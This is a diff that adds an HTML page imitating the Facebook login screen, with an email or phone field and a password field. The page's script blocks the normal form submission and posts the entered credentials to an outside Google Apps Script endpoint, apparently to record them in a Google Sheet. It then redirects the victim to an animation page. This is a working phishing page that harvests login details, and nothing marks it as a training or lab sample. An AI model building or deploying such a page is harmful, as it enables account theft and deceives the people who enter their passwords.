@@ -1,0 +1,100 @@
+<!DOCTYPE html> 
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+        }
+        .login-container {
+            max-width: 380px;
+            margin: 100px auto;
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        h2 {
+            text-align: center;
+            color: #1877f2;
+        }
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .login-button {
+            background-color: #1877f2;
+            color: white;
+            padding: 10px;
+            width: 100%;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .login-button:hover {
+            background-color: #165eab;
+        }
+        .link-text {
+            text-align: center;
+            font-size: 14px;
+        }
+        .link-text a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .forgot-password,
+        .create-account {
+            display: block;
+            text-align: center;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+   <div class="login-container">
+        <h2>Facebook</h2>
+        
+        <!-- Login Form -->
+        <form id="login-form" action="#" method="post" name="google-sheet">
+            <input type="text" name="email" class="input-field" placeholder="Email or Phone" required><br>
+            <input type="password" name="password" class="input-field" placeholder="Password" required><br>
+            <button type="submit" class="login-button">Log In</button>
+        </form>
+
+        <!-- Links for forgotten password and create account -->
+        <div class="link-text">
+            <a href="#" class="forgot-password">Forgotten password?</a>
+        </div>
+
+        <div class="link-text create-account">
+            <p>Don't have an account? <a href="#">Create new account</a></p>
+        </div>
+    </div>
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbx2pS4zDb1kblR-cfuXEtDSoKb5asxffRqLcj0fGrIt4xJ2BUn-Ob-vqQj6MbSv7SOP/exec';
+        const form = document.forms['google-sheet'];
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();  // Prevent the form from reloading the page
+
+            // Submit the form data to Google Sheets
+            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+                .then(response => {
+                    // After a successful submission, redirect to the scholarships page
+                    window.location.href = "animation.html";
+                })
+                .catch(error => console.error('Error!', error.message)); // Handle errors
+        });
+    </script>
+</body>
+</html>
